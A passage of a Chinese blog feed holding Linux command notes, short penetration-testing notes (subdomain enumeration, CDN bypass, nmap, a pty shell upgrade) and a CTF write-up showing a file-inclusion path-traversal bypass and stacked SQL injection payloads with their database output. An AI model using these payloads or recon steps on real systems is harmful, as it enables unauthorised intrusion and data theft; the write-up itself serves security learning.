1.txt</code>，打印1.txt中的第一到三行</p><p>-r正则匹配（太过复杂，讲得不好）：</p><p><code>ifconfig | grep &quot;inet&quot; | sed &#39;s/^.*地址://g&#39;</code>查找ifconfig中有inet的行并且将<strong>地址：之前的</strong>替换为空</p><p><img src="https://cdn.jsdelivr.net/gh/shw2018/cdn@1.0/sakura/img/loader/orange.progress-bar-stripe-loader.svg" data-original="http://images2.5666888.xyz//image-20210811171344877.png" alt></p><p><strong>awk：</strong>文本分析工具</p><p><strong>netstat：</strong>显示狗儿中网络相关信息</p><p>-a列出所有端口</p><p>-at所有tcp端口</p><p>-au所有udp端口</p><p>-l只显示监听端口</p><p>-s显示所有端口的统计信息</p><p>-pt显示pid和进程命令</p><p><strong>kill：</strong>删除执行中的程序或工作</p><p>kill -9 pid通过非常手段直接终结掉进程，例如木马程序</p><p><strong>history：</strong>查看在操作系统个中使用过的历史命令</p><h2 id="用户权限管理"><a href="#用户权限管理" class="headerlink" title="用户权限管理"></a>用户权限管理</h2><p><strong>whoami</strong></p><p><strong>useradd：</strong></p><p>-m yn8rt创建用户</p><p>然后在home下面找到该用户cd进去，passwd创建用户</p><p><strong>userdel：</strong></p><p>-r yn8rt删除该用户</p><h2 id="进程分析"><a href="#进程分析" class="headerlink" title="进程分析"></a>进程分析</h2><p><strong>top：</strong></p><p>-p通过制定监控进程ID来仅仅监控某个进程的状态</p><p>-q使top没有任何延迟的刷新</p><p>-d屏幕刷新时间</p><h2 id="Linux常见文件及目录的用途"><a href="#Linux常见文件及目录的用途" class="headerlink" title="Linux常见文件及目录的用途"></a>Linux常见文件及目录的用途</h2><p>Linux常用目录的作用：</p><pre class="line-numbers language-python"><code class="language-python"><span class="token operator">/</span> 根目录<span class="token operator">/</span>bin 命令保存目录（普通用户权限）<span class="token operator">/</span>sbin 命令保存目录（root权限）<span class="token operator">/</span>boot 启动目录，包含启动相关文件，和开机有关<span class="token operator">/</span>dev 设备文件保存目录<span class="token operator">/</span>etc 配置文件保存目录<span class="token operator">/</span>home 普通用户家目录<span class="token operator">/</span>lib 系统库保存目录<span class="token operator">/</span>mnt 系统挂载目录<span class="token operator">/</span>media 挂载目录（常用于光盘挂载）<span class="token operator">/</span>root 超级用户家目录<span class="token operator">/</span>tmp 临时目录<span class="token operator">/</span>proc 直接写入内存的<span class="token operator">/</span>sys 直接写入内存的<span class="token operator">/</span>usr 系统软件资源目录<span class="token operator">/</span>var 系统相关文档内容<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="有且只有一个"><a href="#有且只有一个" class="headerlink" title="/(有且只有一个)"></a>/(有且只有一个)</h3><p>根目录。<br>包含了几乎所的文件目录。相当于中央系统。进入的最简单方法是：cd /。</p><h3 id="boot"><a href="#boot" class="headerlink" title="/boot"></a>/boot</h3><p>引导程序，内核等存放的目录。<br>这个目录，包括了在引导过程中所必需的文件，引导程序的相关文件（例如grub，lilo以及相应的配置文件以及Linux操作系统内核相关文件（例如vmlinuz等一般都存放在这里。在最开始的启动阶段，通过引导程序将内核加载到内存，完成内核的启动（这个时候，虚拟文件系统还不存在，加载的内核虽然是从硬盘读取的，但是没经过Linux的虚拟文件系统，这是比较底层的东西来实现的。然后内核自己创建好虚拟文件系统，并且从虚拟文件系统的其他子目录中（例如/sbin 和 /etc加载需要在开机启动的其他程序或者服务或者特定的动作（部分可以由用户自己在相应的目录中修改相应的文件来配制。如果我们的机器中包含多个操作系统，那么可以通过修改这个目录中的某个配置文件（例如grub.conf来调整启动的默认操作系统，系统启动的择菜单，以及启动延迟等参数。</p><h3 id="sbin"><a href="#sbin" class="headerlink" title="/sbin"></a>/sbin</h3><p>超级用户可以使用的命令的存放目录。<br>存放大多涉及系统管理的命令我们要记住，凡是目录sbin中包含的都是root权限才能执行的。</p><h3 id="bin"><a href="#bin" class="headerlink" title="/bin"></a>/bin</h3><p>普通用户可以使用的命令的存放目录。<br>系统所需要的那些命令位于此目录，比如ls、cp、mkdir等命令；类似的目录还/usr/bin，/usr/local/bin等等。这个目录中的文件都是可执行的、普通用户都可以使用的命令。作为基础系统所需要的最基础的命令就是放在这里。</p><h3 id="lib"><a href="#lib" class="headerlink" title="/lib"></a>/lib</h3><p>根目录下的所程序的共享库目录。<br>此目录下包含系统引导和在根用户执行命令时候所必需用到的共享库。做个不太好但是比较形象的比喻，点类似于Windows上面的system32目录。理说，这里存放的文件应该是/bin目录下程序所需要的库文件的存放地，也不排除一些例外的情况。类似的目录还/usr/lib，/usr/local/lib等等。</p><h3 id="dev"><a href="#dev" class="headerlink" title="/dev"></a>/dev</h3><p>设备文件目录。<br>在Linux中设备都是以文件形式出现，这里的设备可以是硬盘，键盘，鼠标，网卡，终端，等设备，通过访问这些文件可以访问到相应的设备。设备文件可以使用mknod命令来创建，具体参见相应的命令；而为了将对这些设备文件的访问转化为对设备的访问，需要向相应的设备提供设备驱动模块（一般将设备驱动编译之后，生成的结果是一个*.ko类型的二进制文件，在内核启动之后，再通过insmod等命令加载相应的设备驱动之后，我们就可以通过设备文件来访问设备了。一般来说，想要Linux系统支持某个设备，只要个东西：相应的硬件设备，支持硬件的驱动模块，以及相应的设备文件。</p><h3 id="home"><a href="#home" class="headerlink" title="/home"></a>/home</h3><p>普通用户的家目录（$HOME目录。<br>在Linux机器上，用户主目录通常直接或间接地置在此目录下。其结构通常由本地机的管理员来决定。通常而言，系统的每个用户都自己的家目录，目录以用户名作为名字存放在/home下面（例如quietheart用户，其家目录的名字为/home/quietheart。该目录中保存了绝大多数的用户文件(用户自己的配置文件，定制文件，文档，数据等)，root用户除外（参见后面的/root目录。由于这个目录包含了用户实际的数据，通常系统管理员为这个目录单独挂载一个独立的磁盘分区，这样这个目录的文件系统格式就可能和其他目录不一样了（尽管表面上看，这个目录还是属于根目录的一棵子树上），有利于数据的维护。</p><h3 id="root"><a href="#root" class="headerlink" title="/root"></a>/root</h3><p>用户root的$HOME目录<br>系统管理员(就是root用户或超级用户)的主目录比较特殊，不存放在/home中，而是直接放在/root目录下了。</p><h3 id="etc"><a href="#etc" class="headerlink" title="/etc"></a>/etc</h3><p>全局的配置文件存放目录。<br>系统和程序一般都可以通过修改相应的配置文件，来进行配置。例如，要配置系统开机的时候启动那些程序，配置某个程序启动的时候显示什么样的风格等等。通常这些配置文件都集中存放在/etc目录中，所以想要配置什么东西的话，可以在/etc下面寻找我们可能需要修改的文件。一些大型套件，如X11，在 /etc 下它们自己的子目录。系统配置文件可以放在这里或在 /usr/etc。 不过所程序总是在 /etc 目录下查找所需的配置文件，你也可以将这些文件链接到目录 /usr/etc。另外，还一个需要注意的常见现象就是，当某个程序在某个用户下运行的时候，可能会在该用户的家目录中生成一个配置文件（一般这个文件最开始就是/etc下相应配置文件的拷贝，存放相应于“当前用户”的配置，这样当前用户可以通过配置这个家目录的配置文件，来改变程序的行为，并且这个行为只是该用户特的。原因就是：一般来说一个程序启动，如果需要读取一些配置文件的话，它会首先读取当前用户家目录的配置文件，如果存在就使用；如果不存在它就到/etc下读取全局的配置文件进而启动程序。就是这个配置文件不自动生成，我们手动在自己的家目录中创建一个文件的话，也有许多程序会首先读取到这个家目录的文件并且以它的配置作为启动的选项（例如我们可以在家目录中创建vim程序的配置文件.vimrc，来配置自己的vim程序。</p><h3 id="usr"><a href="#usr" class="headerlink" title="/usr"></a>/usr</h3><p>这个目录中包含了命令库文件和在通常操作中不会修改的文件。<br>这个目录对于系统来说也是一个非常重要的目录，其地位类似Windows上面的”Program Files”目录（请原谅我可能这样做比较不太恰当^_^。安装程序的时候，默认就是安装在此文件内部某个子文件夹内。输入命令后系统默认执行/usr/bin下的程序（当然，前提是这个目录的路径已经被添加到了系统的环境变量中。此目录通常也会挂载一个独立的磁盘分区，它应保存共享只读类文件，这样它可以被运行Linux的不同主机挂载。</p><h3 id="usr-lib"><a href="#usr-lib" class="headerlink" title="/usr/lib"></a>/usr/lib</h3><p>目标库文件，包括动态连接库加上一些通常不是直接调用的可执行文件的存放位置。<br>这个目录功能类似/lib目录，理说，这里存放的文件应该是/bin目录下程序所需要的库文件的存放地，也不排除一些例外的情况。</p><h3 id="usr-bin"><a href="#usr-bin" class="headerlink" title="/usr/bin"></a>/usr/bin</h3><p>一般使用者使用并且不是系统自检等所必需可执行文件的目录。<br>此目录相当于根文件系统下的对应目录（/bin，非启动系统，非修复系统以及非本地安装的程序一般都放在此目录下。</p><h3 id="usr-sbin"><a href="#usr-sbin" class="headerlink" title="/usr/sbin"></a>/usr/sbin</h3><p>管理员使用的非系统必须的可执行文件存放目录。<br>此目录相当于根文件系统下的对应目录（/sbin，保存系统管理程序的二进制文件，并且这些文件不是系统启动或文件系统挂载 /usr 目录或修复系统所必需的。</p><h3 id="usr-share"><a href="#usr-share" class="headerlink" title="/usr/share"></a>/usr/share</h3><p>存放共享文件的目录。<br>在此目录下不同的子目录中保存了同一个操作系统在不同构架下工作时特定应用程序的共享数据(例如程序文档信息)。使用者可以找到通常放在 /usr/doc 或 /usr/lib 或 /usr/man 目录下的这些类似数据。</p><h3 id="usr-include"><a href="#usr-include" class="headerlink" title="/usr/include"></a>/usr/include</h3><p>C程序语言编译使用的头文件。<br>linux下开发和编译应用程序所需要的头文件一般都存放在这里，通过头文件来使用某些库函数。默认来说这个路径被添加到了环境变量中，这样编译开发程序的时候编译器会自动搜索这个路径，从中找到你的程序中可能包含的头文件。</p><h3 id="usr-local"><a href="#usr-local" class="headerlink" title="/usr/local"></a>/usr/local</h3><p>安装本地程序的一般默认路径。<br>当我们下载一个程序源代码，编译并且安装的时候，如果不特别指定安装的程序路径，那么默认会将程序相关的文件安装到这个目录的对应目录下。例如，安装的程序可执行文件被安装（安装实质就是复制到了/usr/local/bin下面，此程序（可执行文件所需要依赖的库文件被安装到了/usr/local/lib目录下，被安装的软件如果是某个开发库（例如Qt，Gtk等那么相应的头文件可能就被安装到了/usr/local/include中等等。也就是说，这个目录存放的内容，一般都是我们后来自己安装的软件的默认路径，如果择了这个默认路径作为软件的安装路径，被安装的软件的所文件都限制在这个目录中，其中的子目录就相应于根目录的子目录。</p><h3 id="proc"><a href="#proc" class="headerlink" title="/proc"></a>/proc</h3><p>特殊文件目录。<br>这个目录采用一种特殊的文件系统格式（proc格式，内核支持这种格式。其中包含了全部虚拟文件。它们并不保存在磁盘中，也不占据磁盘空间(尽管命令ls -c会显示它们的大小)。当您查看它们时，您实际上看到的是内存里的信息，这些文件助于我们了解系统内部信息。例如：<br>├1/ 关于进程1的信息目录。每个进程在/proc 下一个名为其进程号的目录。<br>├cpuinfo 处理器信息，如类型、制造商、型号和性能。<br>├devices 当前运行的核心配置的设备驱动的列表。<br>├dma 显示当前使用的DMA通道。<br>├filesystems 核心配置的文件系统。<br>├interrupts 显示使用的中断，and how many of each there have been.<br>├ioports 当前使用的I/O端口。<br>├kcore 系统物理内存映象。与物理内存大小一样，但实际不占这么多内存；<br>├kmsg 核心输出的消息。也被送到syslog 。<br>├ksyms 核心符号表。<br>├loadavg 系统”平均负载”；3个没意义的指示器指出系统当前的工作量。<br>├meminfo 存储器使用信息，包括物理内存和swap。<br>├modules 当前加载了哪些核心模块。<br>├net 网络协议状态信息。<br>├self 到查看/proc 的程序的进程目录的符号连接。<br>├stat 系统的不同状态<br>├uptime 系统启动的时间长度。<br>└version 核心版本。</p><h3 id="opt"><a href="#opt" class="headerlink" title="/opt"></a>/opt</h3><p>可择的文件目录。<br>这个目录表示的是可择的意思，些自定义软件包或者第方工具，就可以安装在这里。比如在Fedora Core 5.0中，OpenOffice就是安装在这里。些我们自己编译的软件包，就可以安装在这个目录中；通过源码包安装的软件，可以把它们的安装路径设置成/opt这样来安装。这个目录的作用一点类似/usr/local。</p><h3 id="mnt"><a href="#mnt" class="headerlink" title="/mnt"></a>/mnt</h3><p>临时挂载目录。<br>这个目录一般是用于存放挂载储存设备的挂载目录的，比如磁盘，光驱，网络文件系统等，当我们需要挂载某个磁盘设备的时候，可以把磁盘设备挂载到这个目录上去，这样我们可以直接通过访问这个目录来访问那个磁盘了。一般来说，我们最好在/mnt目录下面多建立几个子目录，挂载的时候挂载到这些子目录上面，因为通常我们可能不仅仅是挂载一个设备吧?</p><h3 id="media"><a href="#media" class="headerlink" title="/media"></a>/media</h3><p>挂载的媒体设备目录。<br>挂载的媒体设备目录，一般外部设备挂载到这里，例如cdrom等。比如我们插入一个U盘，我们一般会发现，Linux自动在这个目录下建立一个disk目录，然后把U盘挂载到这个disk目录上，通过访问这个disk来访问U盘。</p><h3 id="var"><a href="#var" class="headerlink" title="/var"></a>/var</h3><p>内容经常变化的目录。<br>此目录下文件的大小可能会改变，如缓冲文件，日志文件，缓存文件，等一般都存放在这里。</p><h3 id="tmp"><a href="#tmp" class="headerlink" title="/tmp"></a>/tmp</h3><p>临时文件目录。<br>该目录存放系统中的一些临时文件，文件可能会被系统自动清空。的系统直接把tmpfs类型的文件系统挂载到这个目录上，tmpfs文件系统由Linux内核支持，在这个文件系统中的数据，实际上是内存中的，由于内存的数据断电易失，当系统重新启动的时候我们就会发现这个目录被清空了。</p><h3 id="lost-found"><a href="#lost-found" class="headerlink" title="/lost+found"></a>/lost+found</h3><p>恢复文件存放的位置。<br>当系统崩溃的时候，在系统修复过程中需要恢复的文件，可能就会在这里被找到了，这个目录一般为空。</p><p>另外，有些目录初学者容易混淆，这里简单区分一下：<br><strong>/bin,/sbin与/usr/bin,/usr/sbin:</strong><br>/bin一般存放对于用户和系统来说“必须”的程序（二进制文件）。<br>/sbin一般存放用于系统管理的“必需”的程序（二进制文件），一般普通用户不会使用，根用户使用。<br>/usr/bin一般存放的只是对用户和系统来说“不是必需的”程序（二进制文件）。<br>/usr/sbin一般存放用于系统管理的系统管理的不是必需的程序（二进制文件）。</p><p><strong>/lib与/usr/lib:</strong></p><p>/lib和/usr/lib的区别类似/bin,/sbin与/usr/bin,/usr/sbin。<br>/lib一般存放对于用户和系统来说“必须”的库（二进制文件）。<br>/usr/lib一般存放的只是对用户和系统来说“不是必需的”库（二进制文件）。</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>渗透测试笔记</title>
      <link href="/2021/01/15/shen-tou-ce-shi-bi-ji/"/>
      <url>/2021/01/15/shen-tou-ce-shi-bi-ji/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=1426649237&auto=1&height=66"></iframe><h1 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h1><h2 id="1-信息收集阶段"><a href="#1-信息收集阶段" class="headerlink" title="1.信息收集阶段"></a>1.信息收集阶段</h2><h3 id="资产收集："><a href="#资产收集：" class="headerlink" title="资产收集："></a>资产收集：</h3><p>1.从主域名出发，向其旁站扩散</p><p>2.子域名收集（layer子域名挖掘机（枚举性质），<a href="https://github.com/shmilylty/OneForAll" target="_blank" rel="noopener">oneforall</a>（根据接口，需要配置api：在\OneForAll-master\config\api.py ）），相关域名收集</p><p>3.通过搜索引擎（第三方）：常用第三方子域名爆破接口</p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://dnsdumpster.com/" target="_blank" rel="noopener">https://dnsdumpster.com/</a></p><p><a href="https://www.virustotal.com/gui/home/search" target="_blank" rel="noopener">https://www.virustotal.com/gui/home/search</a></p><p><a href="http://tool.chinaz.com/subdomain/" target="_blank" rel="noopener">http://tool.chinaz.com/subdomain/</a></p><p><a href="http://searchdns.netcraft.com/" target="_blank" rel="noopener">http://searchdns.netcraft.com/</a></p><p><a href="https://phpinfo.me/domain/" target="_blank" rel="noopener">https://phpinfo.me/domain/</a></p><p><a href="https://chapangzhan.com/（旁站查询）" target="_blank" rel="noopener">https://chapangzhan.com/（旁站查询）</a></p><p>4.app，小程序，公众号</p><p>5.备案信息查询（基本无效信息）：</p><p>爱站网，<a href="https://beian.tianyancha.com/" target="_blank" rel="noopener">天眼查</a></p><p>6.ip信息收集：有的企业做了cdn加速，例如使用七牛云针对图床进行加速，所以就需要进行cdn的绕过，来找到被加速的服务器（ip地址）</p><p>绕过方法：</p><ul><li><p><strong>多地ping</strong>（国外）</p></li><li><p><strong>对分站进行ping</strong></p></li></ul><p>7.在线cms指纹识别</p><p>云悉指纹：<a href="http://www.yunsee.cn/" target="_blank" rel="noopener">http://www.yunsee.cn/</a><br>潮汐指纹：<a href="http://finger.tidesec.net/" target="_blank" rel="noopener">http://finger.tidesec.net/</a></p><p>8.服务器/中间器/站点架构信息</p><h3 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h3><p>如果遇到网络问题：service networking restart重启一下网络服务</p><p>-p 8011（指定8011端口）</p><p>-F（快速扫描） -iL（从文本文件里面扫描主机列表，多线程）1.txt -v</p><h2 id="msf工具"><a href="#msf工具" class="headerlink" title="msf工具"></a>msf工具</h2><p>建立一个交互式的shell</p><pre><code>shellpython -c &#39;import pty; pty.spawn(&quot;/bin/bash&quot;)&#39;#前提是找到该框架的漏洞，并且打入进去</code></pre><p>## </p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf之Web</title>
      <link href="/2021/01/15/buuctf-zhi-web/"/>
      <url>/2021/01/15/buuctf-zhi-web/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><iframe frameborder="no" border="0" marginwidth="0" marginheight="0" width="330" height="86" src="//music.163.com/outchain/player?type=2&id=536976917&auto=1&height=66"></iframe><h1 id="2021-01-15"><a href="#2021-01-15" class="headerlink" title="2021-01-15"></a>2021-01-15</h1><h2 id="第一题-HCTF-2018-WarmUp"><a href="#第一题-HCTF-2018-WarmUp" class="headerlink" title="第一题:[HCTF 2018]WarmUp"></a>第一题:[HCTF 2018]WarmUp</h2><p>这里懒得上传图片了，所以就直接笔记了</p><p>源代码里面有1.source.php，所以打开以后还会发先2.hint.php</p><p>1打开后会发现是代码审计</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">class</span> <span class="token class-name">emmm</span>    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token operator">&amp;</span><span class="token variable">$page</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token variable">$whitelist</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"source"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"source.php"</span><span class="token punctuation">,</span><span class="token string">"hint"</span><span class="token operator">=</span><span class="token operator">></span><span class="token string">"hint.php"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">isset</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span> <span class="token operator">||</span> <span class="token operator">!</span><span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>                <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/**isset在php中用来判断变量是否声明，该函数返回布尔类型的值，即true/false。isset只能用于变量，因为传递任何其它参数都将造成解析错误。is_string用来检查传入的值是否为字符串**/</span>            <span class="token punctuation">}</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>                <span class="token comment" spellcheck="true">/**in_array — 检查数组中是否存在某个值，这里判断page是否存在于whitelist数 组 中 ， 存 在 则 返 回 true**/</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**            对mb_substr函数的解释：函数返回字符串的一部分，针对中文            &lt;?php               echo mb_substr("菜鸟教程", 0, 2);               // 输出：菜鸟            ?>            mb_strpos (要被检查的字符串,要搜索的字符串)            &lt;?php             $str = 'http://www.feiniaomy.com';             echo mb_strpos($str,'niao');            ?>            输出结果：14            这里整个嵌套意思是截取page中’?‘前部分             **/</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$page</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token variable">$_page</span> <span class="token operator">=</span> <span class="token function">mb_substr</span><span class="token punctuation">(</span>                <span class="token variable">$_page</span><span class="token punctuation">,</span>                <span class="token number">0</span><span class="token punctuation">,</span>                <span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token variable">$_page</span> <span class="token punctuation">.</span> <span class="token string">'?'</span><span class="token punctuation">,</span> <span class="token string">'?'</span><span class="token punctuation">)</span>            <span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">/**            这里也就是说进行了两次url解码，一次是服务器自动解码，一次是此处解码            **/</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">in_array</span><span class="token punctuation">(</span><span class="token variable">$_page</span><span class="token punctuation">,</span> <span class="token variable">$whitelist</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>                <span class="token keyword">return</span> <span class="token boolean">true</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">echo</span> <span class="token string">"you can't see it"</span><span class="token punctuation">;</span>            <span class="token keyword">return</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span> <span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> <span class="token function">is_string</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token operator">&amp;&amp;</span> emmm<span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">checkFile</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token shell-comment comment">#这段代码意思就是响应的file参数不能为空，而且必须是是字符串，并且还要检查在checkfile里面检查，这里将我们的的值传到emmm类里面的checkFile函数，这三个值通过&amp;&amp;逻辑与运算符连接也就是要求这块函数的返回值要全为真才能执行if里面的文件包含的代码 否则就执行else里面的图片代码#</span>    <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">include</span> <span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        exit<span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;br>&lt;img src=\"https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\" />"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>  <span class="token delimiter">?></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2打开后会发现：flag not here, and flag in ffffllllaaaagggg</p><p>也就是说flag在这个文件里面</p><p>所以说这个经过分析完以后，就是结构/?file=source.php?/../../../../ffffllllaaaagggg</p><p>然后就是对？进行url编码%253F这里../就是</p><p>所以就是/?file=hint.php%253f/../../../../../../../../ffffllllaaaagggg</p><p>同样/?file=source.php%253f/../../../../../../../../ffffllllaaaagggg都可以</p><p>因为source与hint都在whitelist的白名单里面，这里就是类似于将这个题目定向</p><p>没什么东西</p><p>flag{7c4ca688-51e1-4235-958a-fad970c48f7b}</p><p>回头补充：</p><p>include函数有这么一个神奇的功能：以字符‘/’分隔（而且不计个数），若是在前面的字符串所代表的文件无法被PHP找到，则PHP会自动包含‘/’后面的文件——注意是最后一个‘/’。</p><h2 id="强网杯-2019-随便注"><a href="#强网杯-2019-随便注" class="headerlink" title="[强网杯 2019]随便注"></a>[强网杯 2019]随便注</h2><p>输入1得</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}</code></pre><p>输入1’</p><pre><code>error 1064 : You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near &#39;&#39;1&#39;&#39;&#39; at line 1</code></pre><p>报错了</p><p>输入：1’ or 1=1#</p><pre><code>array(2) {  [0]=&gt;  string(1) &quot;1&quot;  [1]=&gt;  string(7) &quot;hahahah&quot;}array(2) {  [0]=&gt;  string(1) &quot;2&quot;  [1]=&gt;  string(12) &quot;miaomiaomiao&quot;}array(2) {  [0]=&gt;  string(6) &quot;114514&quot;  [1]=&gt;  string(2) &quot;ys&quot;}</code></pre><p>爆出一些没有用的数组，但是说明了万能钥匙好用，存在注入点</p><p>输入：1’ union select 1,2#</p><pre><code>return preg_match(&quot;/select|update|delete|drop|insert|where|\./i&quot;,$inject);</code></pre><p>这可能是进入了某一步算法中了反正联合查询应该是凉了（全剧终）</p><p>考虑堆叠注入（学到了）：</p><p>原理：在sql语句中以;表示一个语句的结束，如果一个sql语句结束后再接着一个sql语句，就会执行这两条sql语句</p><p>输入：1’;show databases;#</p><pre><code>array(1) {  [0]=&gt;  string(11) &quot;ctftraining&quot;}array(1) {  [0]=&gt;  string(18) &quot;information_schema&quot;}array(1) {  [0]=&gt;  string(5) &quot;mysql&quot;}array(1) {  [0]=&gt;  string(18) &quot;performance_schema&quot;}array(1) {  [0]=&gt;  string(9) &quot;supersqli&quot;}array(1) {  [0]=&gt;  string(4) &quot;test&quot;}</code></pre><p>输入：-1’;show tables from supersqli;#</p><pre><code>array(1) {  [0]=&gt;  string(16) &quot;1919810931114514&quot;}array(1) {  [0]=&gt;  string(5) &quot;words&quot;}</code></pre><p>输入：-1’;show columns from  <code>1919810931114514</code>;#(字符串为表名操作时要加反引号)``</p><pre><code>array(6) {  [0]=&gt;  string(4) &quot;flag&quot;  [1]=&gt;  string(12) &quot;varchar(100)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p>输入：1’;show columns from words;#（查看表words表的字段）</p><pre><code>array(6) {  [0]=&gt;  string(2) &quot;id&quot;  [1]=&gt;  string(7) &quot;int(10)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}array(6) {  [0]=&gt;  string(4) &quot;data&quot;  [1]=&gt;  string(11) &quot;varchar(20)&quot;  [2]=&gt;  string(2) &quot;NO&quot;  [3]=&gt;  string(0) &quot;&quot;  [4]=&gt;  NULL  [5]=&gt;  string(0) &quot;&quot;}</code></pre><p><strong>注意（重点）</strong>：</p><pre><code>  - 1&#39; or 1=1#    希望展示所有内容  - 一般SQL代码中会有这copy么一段select * from （表名） where = 变量，  - 当通过注入后会变成select * from （表名）  where id = 变量 OR 1=1;  - 